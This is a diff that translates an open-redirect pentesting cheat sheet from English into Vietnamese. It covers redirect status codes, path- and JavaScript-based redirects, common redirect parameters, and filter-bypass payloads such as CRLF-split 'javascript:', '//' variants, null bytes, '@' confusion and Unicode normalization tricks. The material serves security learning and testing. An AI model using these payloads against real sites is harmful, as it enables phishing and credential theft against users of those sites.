@@ -1,60 +1,62 @@
 # Open URL Redirect
 
-> Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.
+> Redirect và forward không được xác thực xảy ra khi một ứng dụng web chấp nhận input không đáng tin cậy, từ đó có thể khiến ứng dụng web chuyển hướng request đến một URL được chứa trong input không đáng tin cậy. Bằng cách sửa đổi URL input không đáng tin cậy thành một trang web độc hại, kẻ tấn công có thể thực hiện thành công một cuộc tấn công phishing và đánh cắp thông tin xác thực của người dùng. Do tên máy chủ trong liên kết đã bị sửa đổi vẫn giống với trang web ban đầu, các cuộc tấn công phishing có thể trông đáng tin cậy hơn. Các cuộc tấn công redirect và forward không được xác thực cũng có thể được sử dụng để tạo một URL độc hại vượt qua kiểm tra kiểm soát truy cập của ứng dụng, sau đó chuyển hướng kẻ tấn công đến các chức năng đặc quyền mà bình thường họ không thể truy cập.
 
-## Summary
+## Tóm tắt
 
-* [Methodology](#methodology)
-    * [HTTP Redirection Status Code](#http-redirection-status-code)
-    * [Redirect Methods](#redirect-methods)
-        * [Path-based Redirects](#path-based-redirects)
-        * [JavaScript-based Redirects](#javascript-based-redirects)
-        * [Common Query Parameters](#common-query-parameters)
-    * [Filter Bypass](#filter-bypass)
-* [Labs](#labs)
-* [References](#references)
+* [Phương pháp](#methodology)
 
-## Methodology
+  * [HTTP Redirection Status Code](#http-redirection-status-code)
+  * [Các phương thức Redirect](#redirect-methods)
 
-An open redirect vulnerability occurs when a web application or server uses unvalidated, user-supplied input to redirect users to other sites. This can allow an attacker to craft a link to the vulnerable site which redirects to a malicious site of their choosing.
+    * [Redirect dựa trên Path](#path-based-redirects)
+    * [Redirect dựa trên JavaScript](#javascript-based-redirects)
+    * [Các Query Parameter phổ biến](#common-query-parameters)
+  * [Bypass bộ lọc](#filter-bypass)
+* [Các bài lab](#labs)
+* [Tài liệu tham khảo](#references)
 
-Attackers can leverage this vulnerability in phishing campaigns, session theft, or forcing a user to perform an action without their consent.
+## Phương pháp
 
-**Example**: A web application has a feature that allows users to click on a link and be automatically redirected to a saved preferred homepage. This might be implemented like so:
+Lỗ hổng open redirect xảy ra khi một ứng dụng web hoặc máy chủ sử dụng input do người dùng cung cấp mà không xác thực để chuyển hướng người dùng đến các trang web khác. Điều này cho phép kẻ tấn công tạo một liên kết đến trang web dễ bị tổn thương, sau đó chuyển hướng người dùng đến một trang web độc hại do chúng lựa chọn.
+
+Kẻ tấn công có thể tận dụng lỗ hổng này trong các chiến dịch phishing, đánh cắp session hoặc buộc người dùng thực hiện một hành động mà không có sự đồng ý của họ.
+
+**Ví dụ**: Một ứng dụng web có chức năng cho phép người dùng nhấp vào một liên kết và tự động được chuyển hướng đến trang chủ ưa thích đã lưu. Chức năng này có thể được triển khai như sau:
 
 ```ps1
 https://example.com/redirect?url=https://userpreferredsite.com
 ```
 
-An attacker could exploit an open redirect here by replacing the `userpreferredsite.com` with a link to a malicious website. They could then distribute this link in a phishing email or on another website. When users click the link, they're taken to the malicious website.
+Kẻ tấn công có thể khai thác open redirect bằng cách thay thế `userpreferredsite.com` bằng một liên kết đến trang web độc hại. Sau đó, chúng có thể phân phối liên kết này thông qua email phishing hoặc một trang web khác. Khi người dùng nhấp vào liên kết, họ sẽ được đưa đến trang web độc hại.
 
 ## HTTP Redirection Status Code
 
-HTTP Redirection status codes, those starting with 3, indicate that the client must take additional action to complete the request. Here are some of the most common ones:
+Các mã trạng thái HTTP Redirection, bắt đầu bằng số 3, cho biết client cần thực hiện thêm một hành động để hoàn thành request. Một số mã phổ biến:
 
-* [300 Multiple Choices](https://httpstatuses.com/300) - This indicates that the request has more than one possible response. The client should choose one of them.
-* [301 Moved Permanently](https://httpstatuses.com/301) - This means that the resource requested has been permanently moved to the URL given by the Location headers. All future requests should use the new URI.
-* [302 Found](https://httpstatuses.com/302) - This response code means that the resource requested has been temporarily moved to the URL given by the Location headers. Unlike 301, it does not mean that the resource has been permanently moved, just that it is temporarily located somewhere else.
-* [303 See Other](https://httpstatuses.com/303) - The server sends this response to direct the client to get the requested resource at another URI with a GET request.
-* [304 Not Modified](https://httpstatuses.com/304) - This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response.
-* [305 Use Proxy](https://httpstatuses.com/305) -  The requested resource must be accessed through a proxy provided in the Location header.
-* [307 Temporary Redirect](https://httpstatuses.com/307) - This means that the resource requested has been temporarily moved to the URL given by the Location headers, and future requests should still use the original URI.
-* [308 Permanent Redirect](https://httpstatuses.com/308) - This means the resource has been permanently moved to the URL given by the Location headers, and future requests should use the new URI. It is similar to 301 but does not allow the HTTP method to change.
+* [300 Multiple Choices](https://httpstatuses.com/300) - Cho biết request có nhiều response khả thi. Client nên chọn một trong số đó.
+* [301 Moved Permanently](https://httpstatuses.com/301) - Cho biết resource được yêu cầu đã được chuyển vĩnh viễn đến URL được cung cấp trong header `Location`. Tất cả request trong tương lai nên sử dụng URI mới.
+* [302 Found](https://httpstatuses.com/302) - Cho biết resource được yêu cầu đã tạm thời được chuyển đến URL được cung cấp trong header `Location`. Không giống 301, mã này không có nghĩa resource đã được chuyển vĩnh viễn mà chỉ tạm thời nằm ở một địa chỉ khác.
+* [303 See Other](https://httpstatuses.com/303) - Server gửi response này để hướng client lấy resource được yêu cầu tại một URI khác bằng request GET.
+* [304 Not Modified](https://httpstatuses.com/304) - Được sử dụng cho mục đích caching. Nó thông báo cho client rằng response chưa thay đổi, vì vậy client có thể tiếp tục sử dụng phiên bản response đang được cache.
+* [305 Use Proxy](https://httpstatuses.com/305) - Resource được yêu cầu phải được truy cập thông qua proxy được cung cấp trong header `Location`.
+* [307 Temporary Redirect](https://httpstatuses.com/307) - Cho biết resource được yêu cầu đã tạm thời được chuyển đến URL được cung cấp trong header `Location`, và các request trong tương lai vẫn phải sử dụng URI ban đầu.
+* [308 Permanent Redirect](https://httpstatuses.com/308) - Cho biết resource đã được chuyển vĩnh viễn và các request trong tương lai nên sử dụng URI mới. Tương tự 301 nhưng không cho phép thay đổi HTTP method.
 
-## Redirect Methods
+## Các phương thức Redirect
 
-### Path-based Redirects
+### Redirect dựa trên Path
 
-Instead of query parameters, redirection logic may rely on the path:
+Thay vì sử dụng query parameter, logic chuyển hướng có thể dựa trên path:
 
-* Using slashes in URLs: `https://example.com/redirect/http://malicious.com`
-* Injecting relative paths: `https://example.com/redirect/../http://malicious.com`
+* Sử dụng dấu slash trong URL: `https://example.com/redirect/http://malicious.com`
+* Chèn relative path: `https://example.com/redirect/../http://malicious.com`
 
-### JavaScript-based Redirects
+### Redirect dựa trên JavaScript
 
-If the application uses JavaScript for redirects, attackers may manipulate script variables:
+Nếu ứng dụng sử dụng JavaScript để thực hiện redirect, kẻ tấn công có thể thao túng các biến được sử dụng trong script:
 
-**Example**:
+**Ví dụ**:
 
 ```js
 var redirectTo = "http://trusted.com";
@@ -63,7 +65,7 @@ window.location = redirectTo;
 
 **Payload**: `?redirectTo=http://malicious.com`
 
-### Common Query Parameters
+### Các Query Parameter phổ biến
 
 ```powershell
 ?checkout_url={payload}
@@ -89,93 +91,93 @@ window.location = redirectTo;
 /redirect/{payload}
 ```
 
-## Filter Bypass
+## Bypass bộ lọc
 
-* Using a whitelisted domain or keyword
+* Sử dụng domain hoặc keyword nằm trong whitelist
 
-    ```powershell
-    www.whitelisted.com.evil.com redirect to evil.com
-    ```
+  ```powershell
+  www.whitelisted.com.evil.com redirect to evil.com
+  ```
 
-* Using **CRLF** to bypass "javascript" blacklisted keyword
+* Sử dụng **CRLF** để bypass keyword `javascript` bị blacklist
 
-    ```powershell
-    java%0d%0ascript%0d%0a:alert(0)
-    ```
+  ```powershell
+  java%0d%0ascript%0d%0a:alert(0)
+  ```
 
-* Using "`//`" and "`////`" to bypass "http" blacklisted keyword
+* Sử dụng "`//`" và "`////`" để bypass keyword `http` bị blacklist
 
-    ```powershell
-    //google.com
-    ////google.com
-    ```
+  ```powershell
+  //google.com
+  ////google.com
+  ```
 
-* Using "https:" to bypass "`//`" blacklisted keyword
+* Sử dụng `https:` để bypass "`//`" bị blacklist
 
-    ```powershell
-    https:google.com
-    ```
+  ```powershell
+  https:google.com
+  ```
 
-* Using "`\/\/`" to bypass "`//`" blacklisted keyword
+* Sử dụng "`\/\/`" để bypass "`//`" bị blacklist
 
-    ```powershell
-    \/\/google.com/
-    /\/google.com/
-    ```
+  ```powershell
+  \/\/google.com/
+  /\/google.com/
+  ```
 
-* Using "`%E3%80%82`" to bypass "." blacklisted character
+* Sử dụng "`%E3%80%82`" để bypass ký tự "." bị blacklist
 
-    ```powershell
-    /?redir=google。com
-    //google%E3%80%82com
-    ```
+  ```powershell
+  /?redir=google。com
+  //google%E3%80%82com
+  ```
 
-* Using null byte "`%00`" to bypass blacklist filter
+* Sử dụng null byte "`%00`" để bypass bộ lọc blacklist
 
-    ```powershell
-    //google%00.com
-    ```
+  ```powershell
+  //google%00.com
+  ```
 
-* Using HTTP Parameter Pollution
+* Sử dụng HTTP Parameter Pollution
 
-    ```powershell
-    ?next=whitelisted.com&next=google.com
-    ```
+  ```powershell
+  ?next=whitelisted.com&next=google.com
+  ```
 
-* Using "@" character. [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
+* Sử dụng ký tự "`@`". [Common Internet Scheme Syntax](https://datatracker.ietf.org/doc/html/rfc1738)
 
-    ```powershell
-    //<user>:<password>@<host>:<port>/<url-path>
-    http://www.theirsite.com@yoursite.com/
-    ```
+  ```powershell
+  //<user>:<password>@<host>:<port>/<url-path>
+  http://www.theirsite.com@yoursite.com/
+  ```
 
-* Creating folder as their domain
+* Tạo folder có tên giống domain của họ
 
-    ```powershell
-    http://www.yoursite.com/http://www.theirsite.com/
-    http://www.yoursite.com/folder/www.folder.com
-    ```
+  ```powershell
+  http://www.yoursite.com/http://www.theirsite.com/
+  http://www.yoursite.com/folder/www.folder.com
+  ```
 
-* Using "`?`" character, browser will translate it to "`/?`"
+* Sử dụng ký tự "`?`", trình duyệt sẽ chuyển nó thành "`/?`"
 
-    ```powershell
-    http://www.yoursite.com?http://www.theirsite.com/
-    http://www.yoursite.com?folder/www.folder.com
-    ```
+  ```powershell
+  http://www.yoursite.com?http://www.theirsite.com/
+  http://www.yoursite.com?folder/www.folder.com
+  ```
 
 * Host/Split Unicode Normalization
 
-    ```powershell
-    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
-    http://a.com／X.b.com
-    ```
+  ```powershell
+  https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+  http://a.com／X.b.com
+  ```
 
-## Labs
+## Các bài lab
 
 * [Root Me - HTTP - Open redirect](https://www.root-me.org/fr/Challenges/Web-Serveur/HTTP-Open-redirect)
 * [PortSwigger - DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)
 
-## References
+## Tài liệu tham khảo
 
 * [Host/Split Exploitable Antipatterns in Unicode Normalization - Jonathan Birch - August 3, 2019](https://web.archive.org/web/20190819081715/https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
 * [Open Redirect Cheat Sheet - PentesterLand - November 2, 2018](https://web.archive.org/web/20190719012735/https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
